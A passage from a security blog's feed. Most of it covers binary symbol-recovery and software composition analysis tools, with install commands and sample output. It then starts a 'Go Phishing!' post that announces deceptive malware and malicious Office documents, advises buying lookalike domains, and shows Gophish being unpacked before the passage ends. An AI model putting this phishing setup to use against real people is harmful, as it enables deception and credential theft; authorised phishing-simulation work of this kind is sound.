<p>or <code>File</code> -&gt; <code>Load file</code> -&gt; <code>FLIRT signature file</code> to add <code>sig</code> file,<br><img src="/imghost/bsrt/sigs-linux.png" alt="sig list"></p>
<p>After added sig, we can see matched results like:<br><img src="/imghost/bsrt/sigs-res.png" alt="sig result"></p>
<p>To make a comparison, before and after:<br><img src="/imghost/bsrt/sigs-before.png" alt="before sig match"><br><img src="/imghost/bsrt/sigs-after.png" alt="signature matched"></p>
<p>While <code>sig</code> files may be too much, so how to quickly locate which <code>sig</code> to use? </p>
<ul>
<li>Use <code>file</code> or <code>strings</code> to match version information first.</li>
<li>Use <a class="link"   href="https://github.com/maroueneboubakri/lscan" >lscan<i class="fas fa-external-link-alt"></i></a> <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ pip install pyelftools pefile</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/maroueneboubakri/lscan.git</span><br><span class="line">$ <span class="built_in">cd</span> lscan</span><br><span class="line">$ python lscan.py -S amd64/sig -f stripped</span><br><span class="line">No symbol table found bin binary</span><br><span class="line">amd64/sig/libm-2.13.sig 6/445 (1.35%)</span><br><span class="line">amd64/sig/libpthread-2.13.sig 18/319 (5.64%)</span><br><span class="line">amd64/sig/libc-2.23.sig 447/2869 (15.58%)</span><br><span class="line">amd64/sig/libc-2.22.sig 420/2859 (14.69%)</span><br><span class="line">amd64/sig/libssl-1.0.2h.sig 0/665 (0.00%)</span><br><span class="line">amd64/sig/libm-2.23.sig 5/600 (0.83%)</span><br><span class="line">amd64/sig/libc-2.13.sig 133/3369 (3.95%)</span><br><span class="line">amd64/sig/libm-2.22.sig 5/582 (0.86%)</span><br><span class="line">amd64/sig/libpthread-2.22.sig 18/262 (6.87%)</span><br><span class="line">amd64/sig/libcrypto-1.0.2h.sig 3375/5057 (66.74%)</span><br><span class="line">amd64/sig/libpcre-8.38.sig 1/150 (0.67%)</span><br><span class="line">amd64/sig/libpthread-2.23.sig 19/258 (7.36%)</span><br></pre></td></tr></table></figure>
check <a class="link"   href="https://github.com/maroueneboubakri/lscan/wiki/Reverse-Engineer-a-stripped-binary-with-lscan-and-IDApro" >This DEMO<i class="fas fa-external-link-alt"></i></a> out</li>
</ul>
<h3 id="Finger"><a href="#Finger" class="headerlink" title="Finger"></a>Finger</h3><p>The Best by far<br><a class="link"   href="https://github.com/aliyunav/Finger" >Finger<i class="fas fa-external-link-alt"></i></a>, a tool for recognizing function symbol, developed by Alibaba Cloud · Cloud Security Technology Lab.<br>Let’s take a look at the before-and-after comparison:<br><img src="/imghost/bsrt/Finger-before.png" alt="before Finger match"><br><img src="/imghost/bsrt/Finger-after.png" alt="Finger matched"></p>
<h3 id="Rizzo"><a href="#Rizzo" class="headerlink" title="Rizzo"></a>Rizzo</h3><p>It also generate signatures to match, like <code>FLIRT</code>.</p>
<p>While, “Formal” signatures, “Fuzzy” signatures, String-based signatures and Immediate-based signatures can be generated separately, to face scenarios requiring different accuracy.</p>
<p><a class="link"   href="https://github.com/Reverier-Xu/Rizzo-IDA" >Rizzo-IDA<i class="fas fa-external-link-alt"></i></a> for IDA 7.4+, and <a class="link"   href="https://github.com/fireundubh/IDA7-Rizzo" >IDA7-Rizzo<i class="fas fa-external-link-alt"></i></a> for IDA 7.0, and easy to find in <a class="link"   href="https://github.com/tacnetsol/ida/tree/master/plugins/rizzo" >tacnetsol&#x2F;ida<i class="fas fa-external-link-alt"></i></a></p>
<p>To generate signatures for functions in your current IDB:<br><img src="/imghost/bsrt/rizzo_generate.png" alt="Generating Rizzo signatures"></p>
<p>To apply generated signatures to your current IDB:<br><img src="/imghost/bsrt/rizzo_apply.png" alt="Applying Rizzo signatures"></p>
<h3 id="BinDiff-and-Diaphora"><a href="#BinDiff-and-Diaphora" class="headerlink" title="BinDiff and Diaphora"></a><a class="link"   href="https://www.zynamics.com/software.html" >BinDiff<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="http://diaphora.re/" >Diaphora<i class="fas fa-external-link-alt"></i></a></h3><p><a class="link"   href="https://www.zynamics.com/software.html" >BinDiff<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="http://diaphora.re/" >Diaphora<i class="fas fa-external-link-alt"></i></a> are both binary code similarity detection tools, using hashing to do signature matching.</p>
<p>Actually all these tools need is a complete hash&#x2F;signature database.</p>
<h3 id="BinaryAI"><a href="#BinaryAI" class="headerlink" title="BinaryAI"></a>BinaryAI</h3><p>BinaryAI: The Neural Search Engine for Binaries.<br>It used to be a IDA Pro plugin for binary-source matching, with a fairly good performance, opensourced at <a class="link"   href="https://github.com/binaryai/sdk" >binaryai&#x2F;sdk<i class="fas fa-external-link-alt"></i></a>.</p>
<p>Researchers could install and register by referring to <a class="link"   href="https://binaryai.readthedocs.io/en/stable/" >BinaryAI Docs<i class="fas fa-external-link-alt"></i></a>, on which got installation steps, usages, and a video demo.</p>
<div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=413193735&bvid=BV1XV411k7km&cid=192841620&page=1" scrolling="no" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; 
height: 100%; left: 0; top: 0;"> </iframe></div>

<p>However for now BinaryAI aims at SCA, let users upload binary files, BinaryAI provides users with detailed and clear online reports, which include basic file information, software composition analysis, string information, etc., helping users to find the starting point for security analysis and improve efficiency of security analysis.</p>
<p>Try this at <a class="link"   href="https://www.binaryai.cn/" >BinaryAI Binary Analysis Platform<i class="fas fa-external-link-alt"></i></a>. See more docs at <a class="link"   href="https://doc.binaryai.cn/en/" >BinaryAI Documents<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="SCA-Software-Composition-Analysis-Tools"><a href="#SCA-Software-Composition-Analysis-Tools" class="headerlink" title="SCA (Software Composition Analysis) Tools"></a>SCA (Software Composition Analysis) Tools</h2><p>Software composition analysis (SCA) is a process of identifying the third party and open source components in the applications of an organization. This analysis leads to the discovery of security risk, quality of code and license compliance of the components.  </p>
<h3 id="Karta"><a href="#Karta" class="headerlink" title="Karta"></a>Karta</h3><p><a class="link"   href="https://github.com/CheckPointSW/Karta" >“Karta”<i class="fas fa-external-link-alt"></i></a> (Russian for “Map”) is an IDA Python plugin that identifies and matches open-sourced libraries in a given binary.</p>
<p>See <a class="link"   href="https://karta.readthedocs.io/en/latest/index.html" >RTD<i class="fas fa-external-link-alt"></i></a> for its document.</p>
<p>Installation:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ pip install elementals sark</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/CheckPointSW/Karta</span><br><span class="line">$ <span class="built_in">cd</span> Karta</span><br><span class="line">$ python setup.py install</span><br></pre></td></tr></table></figure>
<p>Usage:</p>
<ul>
<li><code>File</code> -&gt; <code>Script File...</code> to choose scripts in <code>https://github.com/CheckPointSW/Karta/tree/master/src</code></li>
<li><code>thumbs_up/thumbs_up_firmware.py</code> and <code>thumbs_up/thumbs_up_ELF.py</code> for analysis on ARM code&#x2F;data segments (dealing with ARM&#x2F;THUMB code transitions), needs <code>scikit-learn</code> library</li>
<li><code>karta_identifier.py</code> identifies the existence of supported open source projects and fingerprints the exact library version, like:  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Karta Identifier - printer_firmware.bin:</span><br><span class="line">========================================</span><br><span class="line"></span><br><span class="line">Identified Open Sources:</span><br><span class="line">------------------------</span><br><span class="line">libpng: 1.2.29</span><br><span class="line">zlib: 1.2.3</span><br><span class="line">OpenSSL: 1.0.1j</span><br><span class="line">gSOAP: 2.7</span><br><span class="line">mDNSResponder: unknown</span><br><span class="line"></span><br><span class="line">Identified Closed Sources:</span><br><span class="line">--------------------------</span><br><span class="line">Treck: unknown</span><br><span class="line"></span><br><span class="line">Missing Open Sources:</span><br><span class="line">---------------------</span><br><span class="line">OpenSSH: Was not found</span><br><span class="line">net-snmp: Was not found</span><br><span class="line">libxml2: Was not found</span><br><span class="line">libtiff: Was not found</span><br><span class="line">MAC-Telnet: Was not found</span><br><span class="line"></span><br><span class="line">Final Note - Karta</span><br><span class="line">------------------</span><br><span class="line">If you encountered any bug, or wanted to add a new extension / feature, don&#x27;t hesitate to contact us on GitHub:</span><br><span class="line">https://github.com/CheckPointSW/Karta</span><br></pre></td></tr></table></figure></li>
<li><code>karta_manual_anchor.py</code> for defining “manual anchors”:  <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python karta_manual_anchor.py --<span class="built_in">help</span></span><br><span class="line">usage: karta_manual_anchor.py [-h] [-D] [-W] bin lib-name lib-version configs</span><br><span class="line"></span><br><span class="line">Enables the user to manually defined matches, acting as manual anchors, later</span><br><span class="line">to be used by Karta<span class="string">&#x27;s Matcher.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">positional arguments:</span></span><br><span class="line"><span class="string">bin            path to the disassembler&#x27;</span>s database <span class="keyword">for</span> the wanted binary</span><br><span class="line">lib-name       name (<span class="keyword">case</span> sensitive) of the relevant open <span class="built_in">source</span> library</span><br><span class="line">lib-version    version string (<span class="keyword">case</span> sensitive) as used by the identifier</span><br><span class="line">configs        path to the *.json <span class="string">&quot;configs&quot;</span> directory</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">-h, --<span class="built_in">help</span>     show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">-D, --debug    <span class="built_in">set</span> logging level to logging.DEBUG</span><br><span class="line">-W, --windows  signals that the binary was compiled <span class="keyword">for</span> Windows</span><br></pre></td></tr></table></figure></li>
<li>other scripts: <code>karta_manual_identifier.py</code>, <code>karta_matcher.py</code>, …</li>
</ul>
<h3 id="OpenSCA-Cli"><a href="#OpenSCA-Cli" class="headerlink" title="OpenSCA-Cli"></a>OpenSCA-Cli</h3><p><a class="link"   href="https://github.com/XmirrorSecurity/OpenSCA-cli" >OpenSCA<i class="fas fa-external-link-alt"></i></a> is intended for scanning the third-party component dependencies and vulnerabilities.</p>
<p>Download <a class="link"   href="https://github.com/XmirrorSecurity/OpenSCA-cli/releases" >github releases<i class="fas fa-external-link-alt"></i></a>&#x2F;<a class="link"   href="https://gitee.com/XmirrorSecurity/OpenSCA-cli/releases" >gitee releases<i class="fas fa-external-link-alt"></i></a> to use.<br>For detecting the component information only:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ opensca-cli -path <span class="variable">$&#123;project_path&#125;</span></span><br></pre></td></tr></table></figure>
<p>For connecting to the cloud platform (visit <a class="link"   href="https://opensca.xmirror.cn/" >opensca.xmirror.cn<i class="fas fa-external-link-alt"></i></a> for token first):</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ opensca-cli -url <span class="variable">$&#123;url&#125;</span> -token <span class="variable">$&#123;token&#125;</span> -path <span class="variable">$&#123;project_path&#125;</span></span><br><span class="line">$ opensca-cli -url https://opensca.xmirror.cn -token <span class="variable">$&#123;token&#125;</span> -path <span class="variable">$&#123;project_path&#125;</span> -out output.json</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Or for using the local vulnerability database:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ opensca-cli -db db.json -path <span class="variable">$&#123;project_path&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="Pigaios"><a href="#Pigaios" class="headerlink" title="Pigaios"></a>Pigaios</h3><p><a class="link"   href="https://github.com/joxeankoret/pigaios" >Pigaios<i class="fas fa-external-link-alt"></i></a> (‘πηγαίος’, Greek for ‘source’ as in ‘source code’) is a tool for diffing&#x2F;matching source codes directly against binaries.</p>
<p>It can match binaries with source regardless of it being compilable or not, using Python CLang bindings to match, and import IDA symbols . However if source can be compiled easily, <a class="link"   href="https://github.com/joxeankoret/diaphora" >Diaphora<i class="fas fa-external-link-alt"></i></a> might be preferred.</p>
<p>Install requirements first (my env: kali-rolling, python 3.10, LLVM-14, IDA 7.7):</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install clang python3-clang libclang-dev python-colorama python-sklearn</span><br><span class="line"><span class="comment"># or </span></span><br><span class="line">$ pip install clang</span><br><span class="line">$ pip install colorama</span><br><span class="line">$ pip install scikit-learn</span><br></pre></td></tr></table></figure>
<p>Choose <a class="link"   href="https://zlib.net/zlib-1.2.13.tar.gz" >Zlib 1.2.13<i class="fas fa-external-link-alt"></i></a> as an example, first generate code signature database.</p>
<p>Step 1: generate project file <code>sbd.project</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ wget https://zlib.net/zlib-1.2.13.tar.gz</span><br><span class="line">$ tar -xzf zlib-1.2.13.tar.gz </span><br><span class="line">$ <span class="built_in">cd</span> zlib-1.2.13</span><br><span class="line"></span><br><span class="line">$ python /path/to/srcbindiff.py -create</span><br><span class="line">Project file <span class="string">&#x27;sbd.project&#x27;</span> created.</span><br><span class="line"></span><br><span class="line">$ cat sbd.project</span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"><span class="comment"># Default Source-Binary-Differ project configuration</span></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line">[GENERAL]</span><br><span class="line">includes = /usr/lib/llvm-14/lib/clang/14.0.6/include</span><br><span class="line">inlines = 0</span><br><span class="line"></span><br><span class="line">[PROJECT]</span><br><span class="line">cflags = -I. -I./include</span><br><span class="line">cxxflags = -I. -I./include</span><br><span class="line">export-file = zlib-1.2.13.sqlite</span><br><span class="line">export-header = zlib-1.2.13-exported.h</span><br><span class="line">export-indent = clang-format -i</span><br><span class="line"></span><br><span class="line">[FILES]</span><br><span class="line">contrib/blast/blast.c = 1</span><br><span class="line">contrib/infback9/infback9.c = 1</span><br><span class="line">contrib/infback9/inftree9.c = 1</span><br><span class="line">contrib/iostream/test.cpp = 1</span><br><span class="line">contrib/iostream/zfstream.cpp = 1</span><br><span class="line">contrib/iostream2/zstream_test.cpp = 1</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>Step 2: generate sqlite database <code>zlib-1.2.13.sqlite</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python /path/to/srcbindiff.py --no-parallel -<span class="built_in">export</span>    <span class="comment"># parallel also work</span></span><br><span class="line">[i] Removing existing file zlib-1.2.13.sqlite</span><br><span class="line">[+] CC contrib/blast/blast.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -..</span><br><span class="line">[+] CC contrib/infback9/infback9.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include..</span><br><span class="line">[+] CC contrib/infback9/inftree9.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include..</span><br><span class="line">[+] CXX contrib/iostream/test.cpp -I/usr/lib/llvm-14/lib/clang/14.0.6/include ..</span><br><span class="line">contrib/iostream/zfstream.h:5,10: fatal: <span class="string">&#x27;fstream.h&#x27;</span> file not found</span><br><span class="line">[+] CXX contrib/iostream/zfstream.cpp -I/usr/lib/llvm-14/lib/clang/14.0.6/incl..</span><br><span class="line">contrib/iostream/zfstream.h:5,10: fatal: <span class="string">&#x27;fstream.h&#x27;</span> file not found</span><br><span class="line">[+] CXX contrib/iostream2/zstream_test.cpp -I/usr/lib/llvm-14/lib/clang/14.0.6..</span><br><span class="line">contrib/iostream2/zstream.h:27,10: fatal: <span class="string">&#x27;strstream.h&#x27;</span> file not found</span><br><span class="line">[+] CXX contrib/iostream3/test.cc -I/usr/lib/llvm-14/lib/clang/14.0.6/include ..</span><br><span class="line">[+] CXX contrib/iostream3/zfstream.cc -I/usr/lib/llvm-14/lib/clang/14.0.6/incl..</span><br><span class="line">[+] CC contrib/minizip/ioapi.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I...</span><br><span class="line">[+] CC contrib/minizip/iowin32.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -..</span><br><span class="line">contrib/minizip/iowin32.h:14,10: fatal: <span class="string">&#x27;windows.h&#x27;</span> file not found</span><br><span class="line">[+] CC contrib/minizip/miniunz.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -..</span><br><span class="line">[+] CC contrib/minizip/minizip.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -..</span><br><span class="line">[+] CC contrib/minizip/mztools.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -..</span><br><span class="line">[+] CC contrib/minizip/unzip.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I...</span><br><span class="line">[+] CC contrib/minizip/zip.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -..</span><br><span class="line">[+] CC contrib/puff/puff.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I...</span><br><span class="line">[+] CC contrib/puff/pufftest.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I...</span><br><span class="line">[+] CC contrib/testzlib/testzlib.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include..</span><br><span class="line">contrib/testzlib/testzlib.c:3,10: fatal: <span class="string">&#x27;windows.h&#x27;</span> file not found</span><br><span class="line">[+] CC contrib/untgz/untgz.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -..</span><br><span class="line">contrib/untgz/untgz.c:277,7: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;chmod&#x27;</span>..</span><br><span class="line">contrib/untgz/untgz.c:341,7: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;mkdir&#x27;</span>..</span><br><span class="line">contrib/untgz/untgz.c:659,11: warning: incompatible pointer types assigning to..</span><br><span class="line">contrib/untgz/untgz.c:665,18: warning: incompatible pointer types passing <span class="string">&#x27;gzF..</span></span><br><span class="line"><span class="string">[+] CC examples/enough.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I./i..</span></span><br><span class="line"><span class="string">[+] CC examples/fitblk.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I./i..</span></span><br><span class="line"><span class="string">[+] CC examples/gun.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I./incl..</span></span><br><span class="line"><span class="string">[+] CC examples/gzappend.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I...</span></span><br><span class="line"><span class="string">[+] CC examples/gzjoin.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I./i..</span></span><br><span class="line"><span class="string">[+] CC examples/gzlog.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I./in..</span></span><br><span class="line"><span class="string">[+] CC examples/gznorm.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I./i..</span></span><br><span class="line"><span class="string">[+] CC examples/zpipe.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I./in..</span></span><br><span class="line"><span class="string">[+] CC examples/zran.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I./inc..</span></span><br><span class="line"><span class="string">[+] CC test/example.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I./incl..</span></span><br><span class="line"><span class="string">[+] CC test/infcover.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I./inc..</span></span><br><span class="line"><span class="string">[+] CC test/minigzip.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I./inc..</span></span><br><span class="line"><span class="string">[+] CC adler32.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I./include</span></span><br><span class="line"><span class="string">[+] CC compress.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I./include</span></span><br><span class="line"><span class="string">[+] CC crc32.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I./include</span></span><br><span class="line"><span class="string">[+] CC deflate.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I./include</span></span><br><span class="line"><span class="string">[+] CC gzclose.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I./include</span></span><br><span class="line"><span class="string">[+] CC gzlib.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I./include</span></span><br><span class="line"><span class="string">[+] CC gzread.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I./include</span></span><br><span class="line"><span class="string">[+] CC gzwrite.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I./include</span></span><br><span class="line"><span class="string">[+] CC infback.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I./include</span></span><br><span class="line"><span class="string">[+] CC inffast.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I./include</span></span><br><span class="line"><span class="string">[+] CC inflate.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I./include</span></span><br><span class="line"><span class="string">[+] CC inftrees.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I./include</span></span><br><span class="line"><span class="string">[+] CC trees.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I./include</span></span><br><span class="line"><span class="string">[+] CC uncompr.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I./include</span></span><br><span class="line"><span class="string">[+] CC ztest19.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I./include</span></span><br><span class="line"><span class="string">[+] CC zutil.c -I/usr/lib/llvm-14/lib/clang/14.0.6/include -I. -I./include</span></span><br><span class="line"><span class="string">[+] Building definitions...</span></span><br><span class="line"><span class="string">[+] Building the callgraphs...</span></span><br><span class="line"><span class="string">[+] Building the constants table...</span></span><br><span class="line"><span class="string">[+] Creating indexes...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">4 warning(s), 0 error(s), 5 fatal error(s)</span></span><br></pre></td></tr></table></figure>
<p>We can open this sqlite db file</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sqlite3 zlib-1.2.13.sqlite</span><br><span class="line">SQLite version 3.40.0 2022-11-16 12:10:08</span><br><span class="line">Enter <span class="string">&quot;.help&quot;</span> <span class="keyword">for</span> usage hints.</span><br><span class="line">sqlite&gt; select name from <span class="built_in">functions</span> <span class="built_in">limit</span> 5;</span><br><span class="line">BeginCountPerfCounter</span><br><span class="line">BeginCountRdtsc</span><br><span class="line">Display64BitsSize</span><br><span class="line">ExprMatch</span><br><span class="line">ExprMatch</span><br><span class="line">sqlite&gt;</span><br></pre></td></tr></table></figure>
<p>Finally use IDA to match binary with source. Take busybox installed from kali-rolling apt repo as an example, as it uses functions in zlib.<br><code>File</code> -&gt; <code>Script File...</code> to choose script <code>sourceimp_ida.py</code><br><img src="/imghost/bsrt/pigaios1.jpg" alt="pigaios sourceimp_ida.py panel"></p>
<p>choose right sqlite file, and we can see the result<br><img src="/imghost/bsrt/pigaios2.jpg" alt="pigaios match result"></p>
<p>We can even visually diffing the pseudo-code of functions, like function <code>gzopen</code><br><img src="/imghost/bsrt/pigaios3.jpg" alt="pigaios pseudo-code diffing"></p>
<p>We can also see match reasons<br><img src="/imghost/bsrt/pigaios4.jpg" alt="pigaios match reasons"></p>
<h3 id="CycloneDX-Dependency-Track-not-for-Binary-but-Open-source"><a href="#CycloneDX-Dependency-Track-not-for-Binary-but-Open-source" class="headerlink" title="CycloneDX + Dependency-Track, not for Binary but Open source"></a>CycloneDX + Dependency-Track, not for Binary but Open source</h3><p>Nowadays SCA tools are mostly commercial and not free open source, but we can get support from community and OWASP.</p>
<p>As companies use multiple languages to develop, SCA tools should cover multi-langs like <code>Java</code>, <code>Golang</code>, <code>Python</code> and  <code>NodeJS</code>.<br>By analysing files like <code>pom.xml</code>, <code>go.mod</code>, <code>requirements.txt</code> and <code>yarn.lock</code> to extract name&#x2F;version of third parties from key parameters, we can achieve software composition analysis.<br>SCA tools should also be convenient to embed in existing <code>DevOps</code> process, and an updating vuln database is needed, which crawling <code>OSSIndex</code>, <code>NVD</code>, <code>NPM</code> and <code>CPE</code>.</p>
<p><a class="link"   href="https://cyclonedx.org/" >CycloneDX<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="https://dependencytrack.org/" >Dependency-Track<i class="fas fa-external-link-alt"></i></a> are both from OWASP.<br>OWASP <code>CycloneDX</code> is a full-stack Bill of Materials (BOM) standard that provides advanced supply chain capabilities for cyber risk reduction, in a word, it creates BOM for projects.<br>OWASP <code>Dependency-Track</code> is a continuous SBOM analysis platform that allows organizations to identify and reduce risk in the software supply chain, it accepts BOM and does vulnerability analysis.</p>
<h4 id="CycloneDX"><a href="#CycloneDX" class="headerlink" title="CycloneDX"></a>CycloneDX</h4><p><code>CycloneDX</code> has its own <a class="link"   href="https://github.com/CycloneDX" >github repos<i class="fas fa-external-link-alt"></i></a> and various plugins for different language projects, like <a class="link"   href="https://github.com/CycloneDX/cyclonedx-maven-plugin" >CycloneDX Maven Plugin<i class="fas fa-external-link-alt"></i></a> for <code>Java</code> and <a class="link"   href="https://github.com/CycloneDX/cyclonedx-gomod" >cyclonedx-gomod<i class="fas fa-external-link-alt"></i></a> for <code>Golang</code>, usages can be found in <code>README</code> and all their results are SBOM for the project.</p>
<h4 id="Dependency-Track"><a href="#Dependency-Track" class="headerlink" title="Dependency-Track"></a>Dependency-Track</h4><p><code>Dependency-Track</code> also has its own <a class="link"   href="https://github.com/DependencyTrack" >github repos<i class="fas fa-external-link-alt"></i></a> and we can setup according to <a class="link"   href="https://docs.dependencytrack.org/getting-started/deploy-docker/" >docs<i class="fas fa-external-link-alt"></i></a>. Deploying with docker container and executable war are both available, here I use <code>jar</code> bundle to run.</p>
<p>First download in <a class="link"   href="https://github.com/DependencyTrack/dependency-track/releases" >releases page<i class="fas fa-external-link-alt"></i></a>. The <code>dependency-track-apiserver.jar</code> should be used with <a class="link"   href="https://github.com/DependencyTrack/frontend" >frontend<i class="fas fa-external-link-alt"></i></a>, and I use <code>dependency-track-bundled.jar</code> which can be used independently. </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ java -jar  dependency-track-bundled.jar</span><br><span class="line"><span class="comment"># visit on http://localhost:8080</span></span><br><span class="line"><span class="comment"># admin/admin to login, change passwd first</span></span><br></pre></td></tr></table></figure>
<p><img src="/imghost/bsrt/dependency-track1.jpg" alt="dependency-track login"></p>
<p>After login, setup a project for testing<br><img src="/imghost/bsrt/dependency-track2.jpg" alt="dependency-track project"></p>
<p>Upload BOM in <code>Components</code> tab to analyze, here we upload the <code>bom.json</code> in <a class="link"   href="https://github.com/DependencyTrack/dependency-track/releases" >releases page<i class="fas fa-external-link-alt"></i></a><br><img src="/imghost/bsrt/dependency-track3.jpg" alt="dependency-track upload BOM"></p>
<p>Finally we get SCA result<br><img src="/imghost/bsrt/dependency-track4.jpg" alt="dependency-track SCA result"></p>
<p>It includes all recognized components, and indexes their potential vulnerabilities.</p>
<h4 id="More"><a href="#More" class="headerlink" title="More"></a>More</h4><p>For DevOps, like for <code>Jenkins</code>, it has <a class="link"   href="https://plugins.jenkins.io/dependency-track/" >dependency-track plugin<i class="fas fa-external-link-alt"></i></a>, and add commands of <code>Cyclonedx</code> to building routine can generate SBOM everytime you build the release.</p>
<p><a class="link"   href="https://github.com/jeremylong/DependencyCheck" >Dependency-Check<i class="fas fa-external-link-alt"></i></a> is also a Software Composition Analysis (SCA) tool that attempts to detect publicly disclosed vulnerabilities contained within a project’s dependencies. It does this by determining if there is a Common Platform Enumeration (CPE) identifier for a given dependency. If found, it will generate a report linking to the associated CVE entries.<br>It also has <a href="https://plugins.jenkins.io/dependency-check-jenkins-plugin/"><code>Jenkins</code> plugin</a> to use.</p>
<p><a class="link"   href="https://snyk.io/" >Synk<i class="fas fa-external-link-alt"></i></a> is another SCA scanner, which provides more accurate service than <code>Dependency-Check</code>, but it is not open source and needs token authentication.</p>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>note</tag>
        <tag>linux</tag>
        <tag>windows</tag>
        <tag>SCA</tag>
      </tags>
  </entry>
  <entry>
    <title>Go Phishing!</title>
    <url>/2022/08/06/2022-08-06-Go-Phishing/</url>
    <content><![CDATA[<p>This article shows methods of phishing, including setting up a phishing mail server, preparing malware (PE) which deceives the target to access, and preparing evil documents&#x2F;tables based on Office suite.</p>
<h2 id="Set-Up-Phishing-Mail-Server"><a href="#Set-Up-Phishing-Mail-Server" class="headerlink" title="Set Up Phishing Mail Server"></a>Set Up Phishing Mail Server</h2><p>Buy similar domains, and prepare two server, one for mail server and another for phishing server.</p>
<p>Phishing server:</p>
<ul>
<li><a class="link"   href="https://github.com/gophish/gophish" >Gophish<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://gitee.com/laowu5/EwoMail" >EwoMail<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>To use <a class="link"   href="https://github.com/gophish/gophish" >Gophish<i class="fas fa-external-link-alt"></i></a>, download the <a class="link"   href="https://github.com/gophish/gophish/releases" >releases<i class="fas fa-external-link-alt"></i></a> and configure the <code>config.json</code>.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/gophish]</span><br><span class="line">└─<span class="comment"># unzip gophish-v0.11.0-linux-64bit.zip</span></span><br><span class="line">Archive:  gophish-v0.11.0-linux-64bit.zip</span><br><span class="line">  inflating: gophish</span><br><span class="line">   creating: static/js/dist/</span><br><span class="line">   creating: static/js/dist/app/</span><br><span class="line">  inflating: static/js/dist/app/landing_pages.min.js</span><br><span class="line">    ...</span><br><span class="line">┌──(root💀kali)-[~/gophish]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">config.json  gophish                          LICENSE    static     VERSION</span><br><span class="line">db           gophish-v0.11.0-linux-64bit.zip  README.md  templates</span><br><span class="line">┌──(root💀kali)-[~/gophish]</span><br><span class="line">└─<span class="comment"># chmod +x gophish</span></span><br></pre></td></tr></table></figure>
<p>Modify the content of <code>config.json</code>:</p>
